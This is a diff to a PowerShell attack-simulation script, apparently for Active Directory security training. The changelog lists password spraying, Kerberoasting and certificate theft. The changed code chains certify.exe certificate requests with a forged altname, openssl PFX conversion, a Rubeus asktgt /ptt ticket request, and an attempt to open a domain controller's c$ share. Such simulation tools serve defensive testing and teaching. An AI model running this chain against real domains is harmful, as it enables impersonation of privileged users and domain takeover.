@@ -47,7 +47,7 @@ https://herrHoZi.com
 ################################################################################
 
 # 2022-11-13 | v2.5.9 |  Attack - Steal or Forge Authentication Certificates
-# 2022-11-12 | v2.1.0 |  Update Function Get-Directories
+# 2022-11-12 | v2.5.8 |  Update Function Get-Directories
 # 2022-11-08 | v2.5.7 |  add developer mode switch, add -ScriptBlock {} and region to source code
 # 2022-11-04 | v2.5.6 |  ADD Function New-PasswordSprayAttack
 # 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
@@ -180,12 +180,17 @@ $myfunction = Get-FunctionName
 Write-Log -Message "### Start Function $myfunction ###"
 #region ################## main code | out- host #####################
 
+Write-host "Try to access the c$ of a Domain Controller`n" -ForegroundColor Yellow
+$directory = "\\$myDC\c$"
+Get-Directories -Path $directory
+
+
 #$password = Read-Host "Enter password for pfx file - $pfxFile"
 $request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt"
 
 Write-Host "`nNext Step: " -NoNewline
 Write-Host $request -ForegroundColor $global:FGCCommand
-Write-Host ""
+Write-Host "`n"
 Write-Log -Message $request
 
 pause
@@ -229,9 +234,10 @@ Write-Log -Message "### Start Function $myfunction ###"
 
 $PfxFile = $pemFile.tolower().Replace("pem","pfx")
 
-Write-Host "`nNext Step:"
+Write-Host "`nNext Step:`n"
 $convert = "openssl pkcs12 -in $pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out $pfxFile"
 Write-Log -Message  $convert
+Write-Log ""
 Write-Host $convert -ForegroundColor $global:FGCCommand
 pause
 
@@ -250,6 +256,8 @@ $StartOpenSSL = Get-KeyValue -key "OpenSSL"
 Invoke-Item $StartOpenSSL | Out-Host
 Start-Sleep -Milliseconds 800
 pause
+
+write-host "Saved to file:" -ForegroundColor Yellow
 Get-Item $pfxFile | Out-Host
 pause
 
@@ -306,8 +314,7 @@ $result = certutil -config $myEntCA -ping
 #Request a Certificates
 If ($result[2].ToLower().Contains("successfully") -eq $True) {
    Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname} | Out-host
-   #Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname} | Out-File .\$pemFile
-   Invoke-Command -ScriptBlock {notepad .\$pemFile}
+   Invoke-Command -ScriptBlock {notepad .\$pemFile} | Out-host
    Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile" 
    }
 else {
@@ -316,6 +323,13 @@ else {
    Write-Host $result[4]
    }
 pause
+
+write-host "Saved to file:" -ForegroundColor Yellow
+Get-Item $pemFile | Out-Host
+
+pause
+
+
 Write-Log -Message "    >> using $pemFile"
 #endregion ####################### main code #########################
 Write-Log -Message "### End Function $myfunction ###"
@@ -391,9 +405,11 @@ $myEntCA    = $temp[1]
 
 $question = "`n -> Enter or confirm the Enterprise Certification Authority! Default "
 $answer = Get-Answer -question $question -defaultValue $myEntCA
-
 Set-KeyValue -key "EnterpriseCA" -NewValue $answer
 
+Write-Host "`n`nUsing this Enterprise Certification Authority for the next steps - $answer`n`n"
+
+pause
 Write-Log -Message "    >> Using - $answer"
 
 #endregion ####################### main code #########################
